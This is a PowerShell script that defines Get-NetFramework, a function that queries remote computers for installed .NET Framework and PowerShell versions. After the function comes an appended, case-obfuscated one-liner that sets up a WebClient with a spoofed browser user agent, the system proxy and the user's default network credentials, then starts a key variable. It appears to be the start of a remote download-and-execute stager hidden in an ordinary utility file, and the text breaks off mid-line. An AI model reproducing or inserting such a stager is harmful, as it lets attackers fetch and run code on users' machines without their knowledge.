function Get-NetFramework
{
    
    [CmdletBinding()]
    PARAM (
        [String[]]$ComputerName,
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )

    $Splatting = @{
        ComputerName = $ComputerName
    }

    if ($PSBoundParameters['Credential']) { $Splatting.credential = $Credential }

    Invoke-Command @Splatting -ScriptBlock {
        Write-Verbose -Message "$pscomputername"

        
        $netFramework = Get-ChildItem -Path 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -recurse |
        Get-ItemProperty -name Version -EA 0 |
        Where-Object { $_.PSChildName -match '^(?!S)\p{L}' } |
        Select-Object -Property PSChildName, Version

        
        $Properties = @{
            ComputerName = "$($env:Computername)$($env:USERDNSDOMAIN)"
            PowerShellVersion = $psversiontable.PSVersion.Major
            NetFramework = $netFramework
        }
        New-Object -TypeName PSObject -Property $Properties
    }
}
$wc=New-ObjEct SySTEM.NET.WebClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEadeRS.AdD('User-Agent',$u);$Wc.PrOxY = [SYsTEM.NeT.WeBREqUeST]::DeFaulTWEBPROXy;$wC.ProXY.CrEDeNtiaLS = [SyStEm.Net.CREDentIalCAChE]::DefAULtNetwoRkCREdenTiAlS;$K='/j(\wly4+aW

